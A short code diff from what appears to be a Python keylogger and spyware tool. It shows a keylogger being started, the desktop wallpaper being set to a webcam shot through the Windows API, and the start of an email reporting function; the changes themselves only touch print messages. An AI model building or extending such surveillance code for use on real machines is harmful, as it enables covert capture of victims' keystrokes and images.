@@ -106,6 +106,7 @@ class Keylogger:
         return
 
 def keys_logger():
+    print('keys logger information')
     keylogger = Keylogger(time_interval=TIMER_DURATION, debug=False)
     keylogger.start()
 
@@ -179,8 +180,8 @@ def set_wallpaper():
 
     # Call Windows API to change wallpaper
     result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, webCamShot_info, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
-    if result: print("Wallpaper changed successfully!")
-    else: print("Failed to change wallpaper.")
+    if result: print("wallpaper changed successfully!")
+    else: print("failed to change wallpaper.")
 
 def send_report():
     # Creating the Email Object
